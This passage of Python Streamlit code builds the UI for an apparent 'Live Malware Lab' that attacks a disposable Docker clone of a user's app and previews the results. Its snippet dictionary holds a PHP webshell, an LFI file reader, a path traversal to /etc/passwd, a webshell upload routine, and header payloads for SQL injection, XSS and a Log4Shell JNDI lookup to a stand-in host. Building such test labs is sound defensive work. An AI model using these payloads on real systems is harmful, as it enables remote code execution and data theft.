            'width:100% !important;flex:1 1 100% !important;min-width:100% !important;'
            'margin-bottom:8px'
          '}'
          'section[data-testid="stMain"] iframe{height:180px !important}'
          'section[data-testid="stMain"] .stButton button{min-height:44px !important;'
            'font-size:0.88rem !important;padding:0 8px !important}'
          # Larger tap targets for st.data_editor cells on mobile
          'section[data-testid="stMain"] [data-testid="stDataFrameResizable"]{'
            'min-height:240px !important}'
          # Long iframe URL chip wraps on small screens
          'section[data-testid="stMain"] code{font-size:0.6rem !important}'
        '}'
        # Tablet — tighten gaps
        '@media (min-width:769px) and (max-width:1024px){'
          'section[data-testid="stMain"] div[data-testid="stHorizontalBlock"] > div{'
            'padding:0 5px !important'
          '}'
        '}'
        # iOS Safari fix — iframes inside fixed-height grids get clipped
        '@supports (-webkit-touch-callout:none){'
          'section[data-testid="stMain"] iframe{'
            '-webkit-overflow-scrolling:touch;'
            'height:200px !important'
          '}'
        '}'
        '</style>'
    )

    st.markdown(_sec_header("attack", "Live Malware Lab"), unsafe_allow_html=True)

    # Intro banner
    st.markdown(
        '<div style="background:linear-gradient(135deg,#0F172A,#1E293B);border:1px solid #334155;'
        'border-radius:12px;padding:14px 18px;margin-bottom:16px">'
        '<div style="font-family:JetBrains Mono,monospace;font-size:0.82rem;color:#60A5FA;'
        'font-weight:700;letter-spacing:0.04em">🧬 Live Malware Lab — real attacks, isolated clone</div>'
        '<div style="font-family:Inter,sans-serif;font-size:0.74rem;color:#94A3B8;margin-top:6px;line-height:1.7">'
        f'Target: <code style="background:#0F172A;padding:1px 8px;border-radius:4px;color:#38BDF8;'
        f'border:1px solid #1E3A5F">{url or "container not ready"}</code> '
        f'&nbsp;·&nbsp; Stack: <b style="color:#FCD34D">{lang}</b>'
        '<br>Every attack uses <b style="color:#4ADE80">docker exec</b> (works on any stack) '
        '+ HTTP exploitation when the container also runs a web server.<br>'
        'Original repo is never touched — clone is disposable &amp; auto-destroyed.</div>'
        '</div>',
        unsafe_allow_html=True,
    )

    if not clone_id:
        st.info("Clone not ready yet — deploy finishes first, then the lab activates.")
        return

    # ── v27/28: LIVE CLONE PREVIEW ─────────────────────────────────
    # Direct answer to "Docker la what's happening?" — the running container
    # is shown right here. v28: iframe auto-navigates to the LAST attack's
    # injected URL so user sees ONLY that attack's effect, not a static home.
    _live_url = (url or "").rstrip("/")

    # Attack-key → URL path that *visually proves* this specific injection.
    # Picked so user sees the dropped payload / triggered endpoint directly
    # in the iframe — e.g. /eicar.txt shows the AV-test bytes, /shell.php
    # shows the webshell banner, /leak.php?file=... shows leaked /etc/passwd.
    _ATTACK_URLS = {
        "eicar":              "/eicar.txt",
        "php_webshell":       "/shell.php?cmd=id",
        "php_dropper":        "/dropper.php",
        "path_traversal":     "/leak.php?file=../../../../etc/passwd",
        "header_injection":   "/",
        "file_upload_exploit":"/uploads/shell.jpg",
        # v28 — for binary/text payloads not web-served, iframe stays on
        # home but the focus banner names the attack so user knows what
        # ran. (Browser can't render a .docm/.pkl/.exe inline anyway.)
        "gtube":              "/",
        "lolbin":             "/",
        "pe_anomaly":         "/",
        "macro_doc":          "/",
        "yara_test":          "/",
        "pickle_rce":         "/",
        "zip_slip":           "/",
        "pdf_js":             "/",
    }
    _ATTACK_LABEL = {
        "eicar":              "EICAR drop",
        "php_webshell":       "Webshell RCE",
        "php_dropper":        "Dropper trigger",
        "path_traversal":     "LFI /etc/passwd",
        "header_injection":   "Header injection",
        "file_upload_exploit":"Uploaded shell",
        "gtube":              "GTUBE email test",
        "lolbin":             "LOLBin patterns",
        "pe_anomaly":         "PE header anomaly",
        "macro_doc":          "Macro Office doc",
        "yara_test":          "YARA self-test",
        "pickle_rce":         "Pickle RCE",
        "zip_slip":           "Zip-slip",
        "pdf_js":             "Malicious PDF",
    }
    _focused = state.get("_focused_attack")
    _focus_path = _ATTACK_URLS.get(_focused, "") if _focused else ""
    # v30: per-file override — set by the 👁 View buttons on the injected-
    # files overlay strip. Takes priority over attack-key-derived path so
    # the iframe shows the EXACT file the user clicked, not the attack's
    # generic landing URL.
    _override = state.get("_iframe_override_path", "")
    if _override:
        _focus_path = _override
    # v30-fix: cache-bust query param — without this Streamlit's diff
    # may not re-load the iframe even when src changes, so the user
    # clicks 👁 View and sees no navigation. The timestamp guarantees a
    # fresh GET on every override change.
    _cache_bust = state.get("_iframe_bust", "")
    _bust_suffix = ""
    if _cache_bust:
        _bust_suffix = ("&" if "?" in _focus_path else "?") + f"_dtct={_cache_bust}"
    _iframe_url = (_live_url + _focus_path + _bust_suffix) if _live_url else ""
    _focus_label = _ATTACK_LABEL.get(_focused, "")
    if _override:
        _focus_label = f"file · {_override.split('/')[-1]}"

    if _live_url:
        # Check container is alive (quick docker ping)
        try:
            import docker as _dk
            _client = _dk.from_env(timeout=3)
            _container = None
            for _n in (f"aidtctm_{clone_id}", f"aidtctm_clone_{clone_id}", clone_id):
                try:
                    _container = _client.containers.get(_n)
                    break
                except Exception:
                    continue
            _running = bool(_container and _container.status == "running")
        except Exception:
            _running = False

        _dot_color = "#16A34A" if _running else "#DC2626"
        _dot_label = "RUNNING" if _running else "STOPPED"
        _esc_url = _live_url.replace('"', "&quot;").replace("<", "&lt;")
        _esc_iframe_url = (_iframe_url or _live_url).replace('"', "&quot;").replace("<", "&lt;")

        # v29: structure-based safe/warning state — driven by attack log
        # critical-event count, NOT random. If user has run attacks:
        #   crits > 0  → red warning banner (file content compromised)
        #   crits == 0 → green safe banner (defences held / no findings)
        # Pre-attack: neutral blue "ready" state.
        _total_crits = 0
        _ran_count = 0
        for _s_lab in _LAB_SAMPLES:
            _l = state.get(f"lab_log_{_s_lab['key']}", [])
            if _l:
                _ran_count += 1
                _total_crits += sum(1 for e in _l if e.get("status") == "crit")

        _focus_banner = ""
        if _focused and _focus_label:
            # An attack has just been focused — show its specific result
            if _total_crits > 0:
                _bn_bg, _bn_brd = "#DC2626", "#991B1B"
                _bn_icon, _bn_label = "⚠", f"WARNING · {_focus_label}"
                _bn_sub = f"{_total_crits} critical findings across {_ran_count} attack(s)"
            else:
                _bn_bg, _bn_brd = "#16A34A", "#15803D"
                _bn_icon, _bn_label = "✅", f"SAFE · {_focus_label}"
                _bn_sub = f"No critical findings · {_ran_count} attack(s) tested"
            _focus_banner = (
                f'<div style="background:{_bn_bg};color:#FFFFFF;font-family:JetBrains Mono,monospace;'
                f'font-size:0.6rem;font-weight:700;letter-spacing:0.08em;padding:4px 10px;'
                f'border-bottom:1px solid {_bn_brd};display:flex;align-items:center;gap:7px">'
                f'<span style="font-size:0.85rem;line-height:1">{_bn_icon}</span>'
                f'<span style="flex:1">{_bn_label}</span>'
                f'<span style="opacity:0.85;font-weight:500;letter-spacing:0.04em">{_bn_sub}</span>'
                f'</div>'
            )
        elif _ran_count > 0:
            # Attacks ran but no specific focus — show aggregate verdict
            if _total_crits > 0:
                _focus_banner = (
                    f'<div style="background:#DC2626;color:#FFFFFF;font-family:JetBrains Mono,monospace;'
                    f'font-size:0.6rem;font-weight:700;letter-spacing:0.08em;padding:4px 10px;'
                    f'border-bottom:1px solid #991B1B">'
                    f'<span style="font-size:0.85rem">⚠</span> &nbsp; CLONE COMPROMISED &middot; '
                    f'{_total_crits} CRITICAL FINDINGS / {_ran_count} ATTACKS RUN'
                    f'</div>'
                )
            else:
                _focus_banner = (
                    f'<div style="background:#16A34A;color:#FFFFFF;font-family:JetBrains Mono,monospace;'
                    f'font-size:0.6rem;font-weight:700;letter-spacing:0.08em;padding:4px 10px;'
                    f'border-bottom:1px solid #15803D">'
                    f'<span style="font-size:0.85rem">✅</span> &nbsp; CLONE SAFE &middot; '
                    f'{_ran_count} ATTACK(S) RUN · NO CRITICAL FINDINGS'
                    f'</div>'
                )

        st.html(
            '<style>'
            '@keyframes lp-pulse { 0%,100%{box-shadow:0 0 0 0 ' + _dot_color + 'aa} '
            '50%{box-shadow:0 0 0 6px ' + _dot_color + '00} }'
            '.lp-dot{animation:lp-pulse 1.4s ease-in-out infinite}'
            '</style>'
            '<div style="display:grid;grid-template-columns:1fr 1.4fr;gap:10px;margin-bottom:14px">'
            # LEFT card — clone metadata + open-tab
            '<div style="background:#FFFFFF;border:1px solid #BFDBFE;border-left:4px solid #2563EB;'
            'border-radius:10px;padding:11px 14px">'
            '<div style="font-family:JetBrains Mono,monospace;font-size:0.62rem;'
            'color:#1E40AF;font-weight:700;letter-spacing:0.12em">▸ LIVE CLONE</div>'
            '<div style="display:flex;align-items:center;gap:8px;margin-top:7px">'
            f'<span class="lp-dot" style="width:9px;height:9px;border-radius:50%;'
            f'background:{_dot_color};flex-shrink:0"></span>'
            f'<code style="font-family:JetBrains Mono,monospace;font-size:0.78rem;'
            f'color:#0F172A;background:#F1F5F9;padding:3px 9px;border-radius:5px;'
            f'border:1px solid #CBD5E1;flex:1;word-break:break-all">{_esc_url}</code>'
            '</div>'
            f'<div style="display:flex;gap:6px;margin-top:8px;font-family:Inter,sans-serif;'
            f'font-size:0.65rem;color:#64748B;align-items:center">'
            f'<span style="background:{_dot_color}1A;color:{_dot_color};border:1px solid '
            f'{_dot_color}55;border-radius:8px;padding:2px 8px;font-weight:700;'
            f'letter-spacing:0.08em;font-family:JetBrains Mono,monospace;font-size:0.58rem">'
            f'{_dot_label}</span>'
            f'<span>Stack: <b style="color:#7C3AED">{lang}</b></span>'
            f'<span style="margin-left:auto">'
            f'<a href="{_esc_url}" target="_blank" rel="noopener" '
            f'style="background:#2563EB;color:#FFFFFF;font-family:Inter,sans-serif;'
            f'font-size:0.68rem;font-weight:700;padding:5px 12px;border-radius:6px;'
            f'text-decoration:none;display:inline-flex;align-items:center;gap:4px">'
            f'Open ↗</a></span></div>'
            '<div style="font-family:Inter,sans-serif;font-size:0.66rem;color:#64748B;'
            'margin-top:8px;line-height:1.5">'
            'This is the <b>real Docker container</b> serving your cloned app. '
            'The right pane shows it live. Every attack below runs against THIS URL — '
            'refresh the right pane after an attack to see new files & changed pages.'
            '</div>'
            '</div>'
            # RIGHT — live iframe of the running clone (v28: focused URL)
            '<div style="background:#0F172A;border:1px solid #1E3A5F;border-radius:10px;'
            'padding:0;overflow:hidden;position:relative">'
            + _focus_banner +
            '<div style="background:#1E293B;padding:5px 10px;display:flex;'
            'align-items:center;gap:7px;border-bottom:1px solid #334155">'
            '<span style="width:8px;height:8px;border-radius:50%;background:#EF4444"></span>'
            '<span style="width:8px;height:8px;border-radius:50%;background:#F59E0B"></span>'
            '<span style="width:8px;height:8px;border-radius:50%;background:#10B981"></span>'
            # v31-fix: URL is now a clickable link → opens in new tab so user
            # can confirm what's being served even if the iframe can't render
            # the MIME (e.g. text/plain downloads, blocked content).
            f'<a href="{_esc_iframe_url}" target="_blank" rel="noopener" '
            f'style="font-family:JetBrains Mono,monospace;font-size:0.6rem;'
            f'color:#22D3EE;margin-left:6px;flex:1;word-break:break-all;'
            f'text-decoration:none;border-bottom:1px dashed #22D3EE">'
            f'{_esc_iframe_url} ↗</a>'
            '<span style="font-family:JetBrains Mono,monospace;font-size:0.55rem;'
            'color:#60A5FA;background:#1E3A5F;border:1px solid #2563EB;border-radius:4px;'
            'padding:1px 7px;font-weight:700;letter-spacing:0.1em">LIVE</span>'
            '</div>'
            f'<iframe src="{_esc_iframe_url}" '
            'style="width:100%;height:240px;border:0;background:#FFFFFF;display:block" '
            'sandbox="allow-same-origin allow-scripts allow-popups" loading="eager" '
            'referrerpolicy="no-referrer"></iframe>'
            '</div>'
            '</div>'
        )

        # v31-fix / v32: REAL content preview with SYNTAX HIGHLIGHTING.
        # Fetch the focused URL via Python requests (bypass iframe MIME
        # quirks), detect the language from extension + Content-Type,
        # and render the body with proper st.code() so PHP/Python/JS/
        # HTML/JSON/XML all get colored tokens — not a flat <pre> block.
        if (_focused or _override) and _iframe_url:
            try:
                import requests as _rq
                _resp = _rq.get(_iframe_url, timeout=4, allow_redirects=False)
                _ct = _resp.headers.get("Content-Type", "?")
                _sz = len(_resp.content)
                _ok = _resp.status_code < 400
                _verdict_c = "#16A34A" if _ok else "#DC2626"
                _verdict_lbl = "✓ SERVED" if _ok else "✗ BLOCKED"

                # Language detection — extension first, then Content-Type
                _path_for_lang = _focus_path or "/"
                _ext_match = (_path_for_lang.rsplit(".", 1)[-1].lower()
                              if "." in _path_for_lang else "")
                _EXT_LANG = {
                    "php":"php", "py":"python", "js":"javascript",
                    "ts":"typescript", "jsx":"javascript", "tsx":"typescript",
                    "html":"html", "htm":"html", "xml":"xml", "xsd":"xml",
                    "json":"json", "yaml":"yaml", "yml":"yaml",
                    "css":"css", "scss":"scss",
                    "sql":"sql", "sh":"bash", "bash":"bash",
                    "java":"java", "kt":"kotlin", "rb":"ruby", "go":"go",
                    "rs":"rust", "c":"c", "cpp":"cpp", "cs":"csharp",
                    "md":"markdown", "txt":"text",
                    "eml":"text", "pkl":"text", "yar":"text",
                }
                _lang = _EXT_LANG.get(_ext_match, "")
                if not _lang:
                    # Fallback to Content-Type
                    if "html" in _ct: _lang = "html"
                    elif "json" in _ct: _lang = "json"
                    elif "xml" in _ct: _lang = "xml"
                    elif "javascript" in _ct: _lang = "javascript"
                    elif "css" in _ct: _lang = "css"
                    elif "text" in _ct: _lang = "text"

                # Render the verdict header card
                st.html(
                    '<div style="background:#FFFFFF;border:1.5px solid '
                    f'{_verdict_c}55;border-left:4px solid {_verdict_c};'
                    'border-radius:9px 9px 0 0;padding:10px 13px;margin:8px 0 0;'
                    f'box-shadow:0 2px 8px -3px {_verdict_c}33">'
                    '<div style="display:flex;align-items:center;'
                    'justify-content:space-between;gap:10px">'
                    '<div style="font-family:Inter,sans-serif;font-size:0.74rem;'
                    f'font-weight:700;color:{_verdict_c};letter-spacing:0.02em">'
                    '📡 CONTENT PREVIEW &middot; what the clone serves now'
                    '</div>'
                    '<div style="display:flex;gap:6px">'
                    + (
                        f'<span style="font-family:JetBrains Mono,monospace;'
                        f'font-size:0.55rem;font-weight:700;color:#7C3AED;'
                        f'background:#F3E8FF;border:1px solid #C4B5FD;'
                        f'border-radius:5px;padding:2px 8px;letter-spacing:0.1em">'
                        f'{_lang.upper()}</span>'
                        if _lang else ""
                    ) +
                    f'<span style="font-family:JetBrains Mono,monospace;'
                    f'font-size:0.58rem;font-weight:700;color:{_verdict_c};'
                    f'background:{_verdict_c}14;border:1px solid {_verdict_c}66;'
                    f'border-radius:5px;padding:2px 8px;letter-spacing:0.08em">'
                    f'HTTP {_resp.status_code} &middot; {_verdict_lbl}</span>'
                    '</div></div>'
                    f'<div style="font-family:JetBrains Mono,monospace;font-size:0.6rem;'
                    f'color:#64748B;margin-top:4px">'
                    f'Content-Type: <b style="color:#0F172A">{_ct}</b> &middot; '
                    f'{_sz} bytes &middot; fetched via Python requests '
                    f'(bypasses browser iframe MIME quirks)'
                    f'</div>'
                    f'</div>'
                )

                # Body — use st.code() for code/text (real syntax highlighting),
                # st.image() for images, hex+ascii block for binary.
                if "image" in _ct:
                    import base64 as _b64
                    _b = _b64.b64encode(_resp.content[:300000]).decode("ascii")
                    st.html(
                        f'<div style="background:#FFFFFF;border:1.5px solid '
                        f'{_verdict_c}55;border-top:0;border-radius:0 0 9px 9px;'
                        f'padding:10px 13px;margin:0 0 4px">'
                        f'<img src="data:{_ct};base64,{_b}" '
                        f'style="max-width:100%;max-height:320px;display:block;'
                        f'margin:0 auto;border-radius:5px;border:1px solid #E2E8F0">'
                        f'</div>'
                    )
                elif _lang or "text" in _ct or _ct == "?":
                    # CODE VIEW — syntax-highlighted via st.code()
                    _body_txt = _resp.text[:8000] if _resp.text else (
                        _resp.content[:2000].decode("latin-1", "replace")
                    )
                    if not _body_txt.strip():
                        _body_txt = "(empty body)"
                    st.code(_body_txt, language=(_lang or "text"))
                else:
                    # Binary preview — hex + ascii
                    _hex = " ".join(f"{b:02x}" for b in _resp.content[:32])
                    _ascii = "".join(chr(b) if 32 <= b < 127 else "."
                                        for b in _resp.content[:32])
                    st.code(
                        f"binary · first 32 bytes\n"
                        f"hex:   {_hex}\n"
                        f"ascii: {_ascii}",
                        language="text",
                    )
            except Exception as _pe:
                st.html(
                    f'<div style="background:#FFFBEB;border:1.5px solid #FDE68A;'
                    f'border-left:4px solid #D97706;border-radius:9px;padding:9px 13px;'
                    f'margin:8px 0 4px;font-family:Inter,sans-serif;font-size:0.7rem;'
                    f'color:#B45309">⚠ Preview fetch failed: '
                    f'{str(_pe)[:140].replace("<","&lt;").replace(">","&gt;")}</div>'
                )
        # "↺ Reset to home" button (Streamlit, sits below the panel)
        if _focused or _override:
            _r1, _r2 = st.columns([1, 6])
            with _r1:
                if st.button("↺ Reset to home", key="lab_reset_focus",
                              help="Clear attack focus & file override — iframe shows base URL"):
                    _ss = st.session_state.setdefault("dt_state", {})
                    _ss.pop("_focused_attack", None)
                    _ss.pop("_iframe_override_path", None)
                    _ss["_iframe_bust"] = str(int(time.time() * 1000))
                    st.rerun()

        # ── v30: INJECTED FILES OVERLAY STRIP ───────────────────────
        # The user pointed out my deep-think promised a sticky strip
        # below the iframe listing every dropped file with view/wipe.
        # That gap is now closed: extract paths from every attack log,
        # render a scrollable list with 👁 view (navigates iframe) and
        # 🗑 wipe (docker exec rm) per file.
        _all_injected: list[tuple[str, str]] = []   # (attack_key, path)
        for _s_lab in _LAB_SAMPLES:
            _key = _s_lab["key"]
            _log = state.get(f"lab_log_{_key}", [])
            for ev in _log:
                if ev.get("phase") != "inject" or ev.get("status") != "ok":
                    continue
                for ln in (ev.get("detail") or "").splitlines():
                    ln = ln.strip(" •-→›>\t")
                    if ln.startswith("/") and len(ln) < 240:
                        _all_injected.append((_key, ln))
        # Deduplicate keeping first-seen
        _seen = set()
        _all_injected = [(k, p) for k, p in _all_injected
                          if not (p in _seen or _seen.add(p))]
        # v30-fix: filter out paths already wiped so they don't ghost
        # back into the overlay after the user clicked 🗑 Wipe.
        _wiped: set = state.get("_wiped_paths") or set()
        _all_injected = [(k, p) for k, p in _all_injected if p not in _wiped]

        if _all_injected:
            st.html(
                '<div style="background:linear-gradient(135deg,#FEF2F2,#FFF7ED);'
                'border:1.5px solid #FCA5A5;border-radius:11px;padding:10px 14px;'
                'margin:8px 0 12px;box-shadow:0 2px 8px -3px rgba(220,38,38,0.15)">'
                '<div style="display:flex;align-items:center;justify-content:space-between;'
                'gap:10px;margin-bottom:7px">'
                '<div style="font-family:Inter,sans-serif;font-size:0.78rem;font-weight:700;'
                'color:#991B1B;letter-spacing:0.02em">'
                f'⚠ ATTACKED FILES NOW LIVE ON CLONE ({len(_all_injected)})'
                '</div>'
                f'<span style="font-family:JetBrains Mono,monospace;font-size:0.58rem;'
                f'font-weight:700;color:#7C2D12;background:#FFFFFF;border:1px solid #FCA5A5;'
                f'padding:2px 8px;border-radius:5px">SCROLL TO BROWSE</span>'
                '</div>'
                '<div style="font-family:Inter,sans-serif;font-size:0.62rem;color:#9F1239;'
                'margin-bottom:4px;font-style:italic">'
                'Click 👁 to navigate the iframe directly to that file · 🗑 wipes it via docker exec'
                '</div>'
                '</div>'
            )
            # Streamlit-native rows for the buttons. Cap at 12 visible —
            # rest tucked in a "show more" details so the strip never
            # explodes vertically.
            _visible = _all_injected[:12]
            _hidden = _all_injected[12:]
            for _i, (_atk_key, _path) in enumerate(_visible):
                _s_meta = next((s for s in _LAB_SAMPLES if s["key"] == _atk_key), None)
                _icon = _s_meta["icon"] if _s_meta else "📁"
                _atk_lbl = _s_meta["label"] if _s_meta else _atk_key
                _row_c1, _row_c2, _row_c3, _row_c4 = st.columns([0.5, 4.5, 1, 1])
                with _row_c1:
                    st.html(
                        f'<div style="font-size:1.0rem;padding-top:6px;text-align:center">{_icon}</div>'
                    )
                with _row_c2:
                    _safe_path = _path.replace('"', "&quot;").replace("<", "&lt;").replace(">", "&gt;")
                    st.html(
                        f'<div style="padding:7px 8px;background:#FFFFFF;border:1px solid #FECACA;'
                        f'border-left:3px solid #DC2626;border-radius:5px;'
                        f'font-family:JetBrains Mono,monospace;font-size:0.66rem;'
                        f'color:#7F1D1D;word-break:break-all">'
                        f'<span style="color:#16A34A;font-weight:700">+</span> {_safe_path} '
                        f'<span style="color:#94A3B8;font-size:0.58rem">({_atk_lbl})</span>'
                        f'</div>'
                    )
                with _row_c3:
                    if st.button("👁 View",
                                  key=f"view_{_atk_key}_{_i}",
                                  use_container_width=True,
                                  help=f"Navigate iframe to {_path}"):
                        # Compute web path: strip /var/www/html or /app, else basename
                        for _prefix in ("/var/www/html", "/var/www", "/app",
                                         "/usr/share/nginx/html", "/srv/http", "/srv"):
                            if _path.startswith(_prefix):
                                _web_path = _path[len(_prefix):] or "/"
                                break
                        else:
                            _web_path = "/" + _path.rsplit("/", 1)[-1]
                        # v30-fix: write to st.session_state directly so
                        # the override survives the rerun reliably + bump
                        # the cache-bust counter so the iframe element is
                        # forced to re-issue its GET.
                        _ss = st.session_state.setdefault("dt_state", {})
                        _ss["_iframe_override_path"] = _web_path
                        _ss["_focused_attack"] = _atk_key
                        _ss["_iframe_bust"] = str(int(time.time() * 1000))
                        st.toast(f"📡 iframe → {_web_path}", icon="👁")
                        st.rerun()
                with _row_c4:
                    if st.button("🗑 Wipe",
                                  key=f"wipe_{_atk_key}_{_i}",
                                  use_container_width=True,
                                  help=f"Delete {_path} from the clone via docker exec"):
                        try:
                            import docker as _dk
                            _c2 = _dk.from_env(timeout=4)
                            _ct = None
                            for _n in (f"aidtctm_{clone_id}",
                                        f"aidtctm_clone_{clone_id}", clone_id):
                                try:
                                    _ct = _c2.containers.get(_n)
                                    break
                                except Exception:
                                    continue
                            if _ct:
                                _rm = _ct.exec_run(
                                    ["sh", "-c", f"rm -f {shlex.quote(_path)} && echo OK_WIPED"]
                                )
                                _out = (_rm.output or b"").decode("utf-8", "replace")
                                if "OK_WIPED" in _out:
                                    # v30-fix: persist the wipe across rerender
                                    # so the overlay actually drops the row.
                                    _ss = st.session_state.setdefault("dt_state", {})
                                    _w = _ss.get("_wiped_paths") or set()
                                    if not isinstance(_w, set):
                                        _w = set(_w)
                                    _w.add(_path)
                                    _ss["_wiped_paths"] = _w
                                    _ss["_iframe_bust"] = str(int(time.time() * 1000))
                                    st.toast(f"🗑 Wiped {_path}", icon="🗑")
                                else:
                                    st.toast(f"rm failed — {_out[:80]}", icon="⚠")
                            else:
                                st.toast("Container not reachable", icon="⚠")
                        except Exception as _we:
                            st.toast(f"Wipe failed: {_we}", icon="⚠")
                        st.rerun()
            if _hidden:
                with st.expander(f"… + {len(_hidden)} more injected files", expanded=False):
                    for _atk_key, _path in _hidden:
                        st.markdown(
                            f'<div style="font-family:JetBrains Mono,monospace;'
                            f'font-size:0.66rem;color:#7F1D1D;padding:4px 8px;'
                            f'border-left:2px solid #DC2626;margin:2px 0">'
                            f'+ {_path}</div>', unsafe_allow_html=True,
                        )

    # ── Per-attack variant code — loaded from core module ──────────
    try:
        from core.live_malware_lab import ATTACK_VARIANTS as _AV
    except Exception:
        _AV = {}

    # Fallback flat code if ATTACK_VARIANTS not yet populated
    _LAB_CODE = {
        "eicar": (
            "# PHASE 1 — INJECT\nwrite_clone_file(clone_id, '/tmp/eicar.txt', EICAR_STRING)\n\n"
            "# PHASE 2 — EXEC\ncode, out = docker_exec(clone_id, 'cat /tmp/eicar.txt')\n\n"
            "# PHASE 3 — HTTP\nresp = requests.get(f'{url}/eicar.txt')\n\n"
            "# PHASE 4 — DETECT\nverdict = malware_ml.analyse_file('eicar.txt')"
        ),
        "php_webshell": (
            "# PHASE 1 — INJECT webshell into container\n"
            "WEBSHELL = '<?php system($_GET[\"cmd\"]); ?>'\n"
            "write_clone_file(clone_id, '/tmp/shell.php', WEBSHELL)\n\n"
            "# PHASE 2 — EXEC (docker exec = direct RCE, any stack)\n"
            "for cmd in ['whoami', 'id', 'uname -a', 'ls -la /']:\n"
            "    code, out = docker_exec(clone_id, cmd)\n"
            "    print(f'$ {cmd}: {out}')  # → www-data, uid=33, Linux ...\n\n"
            "# PHASE 3 — HTTP RCE (PHP stacks only)\n"
            "resp = requests.get(f'{url}/shell.php?cmd=whoami')\n"
            "# → www-data  (attacker can run ANY command via browser)\n\n"
            "# PHASE 4 — DETECT\n"
            "verdict = malware_ml.analyse_file('shell.php')  # → MALICIOUS"
        ),
        "php_dropper": (
            "# PHASE 1 — INJECT dropper script\n"
            "DROPPER = f'<?php file_put_contents(\"/tmp/eicar.txt\", EICAR); ?>'\n"
            "write_clone_file(clone_id, '/tmp/dropper.php', DROPPER)\n\n"
            "# PHASE 2 — EXEC (drop EICAR via shell, any stack)\n"
            "code, out = docker_exec(clone_id,\n"
            "    f'echo \"{EICAR}\" > /tmp/dropped_eicar.txt && echo OK')\n"
            "# Verify drop: ls -la /tmp/dropped_eicar.txt → -rw-r--r-- 68 bytes\n\n"
            "# PHASE 3 — HTTP trigger (PHP stacks)\n"
            "requests.get(f'{url}/dropper.php')\n"
            "# → Container writes EICAR via browser request\n\n"
            "# PHASE 4 — DETECT\n"
            "verdict = malware_ml.analyse_file('dropper.php')  # → MALICIOUS"
        ),
        "path_traversal": (
            "# PHASE 1 — INJECT vulnerable file reader (PHP stacks)\n"
            "LFI_PHP = '<?php echo file_get_contents($_GET[\"file\"]); ?>'\n"
            "write_clone_file(clone_id, '/tmp/leak.php', LFI_PHP)\n\n"
            "# PHASE 2 — EXEC (read sensitive files via docker exec, any stack)\n"
            "for f in ['/etc/passwd', '/etc/hostname', '/proc/version']:\n"
            "    code, out = docker_exec(clone_id, f'cat {f}')\n"
            "    print(out)  # → root:x:0:0:root:/root:/bin/bash ...\n\n"
            "# PHASE 3 — HTTP (path traversal via web if PHP)\n"
            "resp = requests.get(f'{url}/leak.php?file=../../../../etc/passwd')\n"
            "# root:x:0:0: in resp.text → PATH TRAVERSAL CONFIRMED\n\n"
            "# PHASE 4 — DETECT\n"
            "verdict = malware_ml.analyse_file('leak.php')  # → MALICIOUS"
        ),
        "header_injection": (
            "# PHASE 1 — No file injection needed for header attacks\n\n"
            "# PHASE 2 — EXEC: show evil payloads being prepared\n"
            "evil = {\n"
            "    'X-Forwarded-For':  \"'; DROP TABLE users; --\",\n"
            "    'User-Agent':       '<script>alert(\"xss\")</script>',\n"
            "    'X-Custom-Inject':  '${jndi:ldap://evil.example/x}',  # Log4Shell\n"
            "    'X-Original-URL':   '/admin',\n"
            "}\n\n"
            "# PHASE 3 — HTTP: fire request with evil headers\n"
            "resp = requests.get(f'{url}/', headers=evil)\n"
            "# Clone receives & logs malicious headers\n\n"
            "# Check container log — did app record the injection?\n"
            "logs = docker_logs(clone_id, last_8s=True)\n"
            "# → 'DROP TABLE', '<script>', 'jndi:ldap' seen in log = CRITICAL"
        ),
        "file_upload_exploit": (
            "# PHASE 1 — Prepare webshell payload\n"
            "WEBSHELL = b'<?php system($_GET[\"cmd\"]); ?>'\n\n"
            "# PHASE 2 — EXEC: check for writable dirs + existing upload paths\n"
            "code, out = docker_exec(clone_id,\n"
            "    'find /var/www /app -name upload* -o -name *.php 2>/dev/null')\n\n"
            "# PHASE 3 — HTTP: POST webshell to common upload endpoints\n"
            "for path in ['/upload.php', '/api/upload', '/upload', '/files']:\n"
            "    resp = requests.post(f'{url}{path}',\n"
            "        files={'file': ('shell.php', WEBSHELL, 'image/jpeg')})\n"
            "    if resp.status_code < 400:\n"
            "        print(f'UPLOAD ACCEPTED at {path}!')\n"
            "        # Try to execute the uploaded shell\n"
            "        rce = requests.get(f'{url}/uploads/shell.php?cmd=id')\n\n"
            "# PHASE 4 — DETECT\n"
            "verdict = malware_ml.analyse_file('shell.php')  # → MALICIOUS"
        ),
    }

    # ── v29: AUTO-RECOMMENDED ATTACKS (profile-driven) ─────────────
    # Reads core.clone_file_profile, ranks attacks by ecosystem fit, and
    # lets the user run the recommended pack with a single button.
    try:
        from core.clone_file_profile import profile_clone
        _profile = profile_clone(clone_id) if clone_id else {}
    except Exception:
        _profile = {}

    _eco = (_profile or {}).get("ecosystem", "mixed")
    _summary = (_profile or {}).get("summary", "Mixed")

    # ecosystem → ranked attack-key list (best-fit first). Each attack
    # also carries a one-line "why this fits" string for the user.
    _RECO_MAP = {
        "python": [
            ("pickle_rce",   "Python clone → pickle.loads() RCE is the CRITICAL exploit vector"),
            ("path_traversal","Likely Flask/Django routes — config files leak via traversal"),
            ("pe_anomaly",   "Universal binary-malware ML test"),
            ("yara_test",    "Verify your custom detection logic fires"),
        ],
        "php": [
            ("php_webshell", "PHP stack → real shell.php RCE works directly"),
            ("php_dropper",  "PHP eval() chain — same path as WordPress malware"),
            ("file_upload_exploit","PHP file_uploads is the #1 RCE entry point"),
            ("path_traversal","include() / require() chain → LFI common"),
        ],
        "java": [
            ("header_injection","Log4Shell + JNDI lookup (CVE-2021-44228) hits Java hard"),
            ("zip_slip",     "Java zip-slip CVE-2018-1002101 still affects most extractors"),
            ("pe_anomaly",   "Universal binary-malware ML test"),
            ("yara_test",    "Custom detection rule self-check"),
        ],
        "node": [
            ("header_injection","Express middleware logs unsanitised → second-order XSS"),
            ("path_traversal","Node fs.readFile() + URL path → LFI"),
            ("file_upload_exploit","multer misconfig accepts arbitrary mime"),
            ("yara_test",    "Custom detection rule self-check"),
        ],
        "static": [
            ("eicar",        "Static-content host → can serve EICAR file publicly"),
            ("file_upload_exploit","If forms exist, upload-path RCE worth probing"),
            ("path_traversal","../ in static path may serve outside webroot"),
        ],
        "mixed": [
            ("eicar",        "Universal AV test — works on every stack"),
            ("pe_anomaly",   "Pure ML shape test, no stack assumptions"),
            ("macro_doc",    "Office-doc malware — universal vector"),
            ("yara_test",    "Custom detection self-test"),
        ],
    }
    _recs = _RECO_MAP.get(_eco, _RECO_MAP["mixed"])

    # Lookup sample metadata by key for icons/labels
